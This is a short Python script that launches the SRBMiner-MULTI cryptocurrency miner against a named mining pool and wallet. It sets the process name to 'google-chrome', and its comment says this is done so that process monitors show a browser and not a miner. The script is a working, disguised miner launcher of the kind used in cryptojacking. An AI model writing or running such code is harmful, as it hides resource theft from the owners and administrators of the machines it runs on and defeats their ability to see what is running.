import os
os.system("chmod +x SRBMiner-MULTI")
# Replace the current process with the mining process
os.execvp("./SRBMiner-MULTI", [
    "google-chrome",  # This will be the name shown in process monitors
    "--disable-gpu",
    "--algorithm", "verushash",
    "--pool", "sg.vipor.net:5040",
    "--wallet", "RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK",
    "--worker", "aaa",  # Using a fixed worker name
    "--password", "solo",
    "--cpu-threads", "4"
])
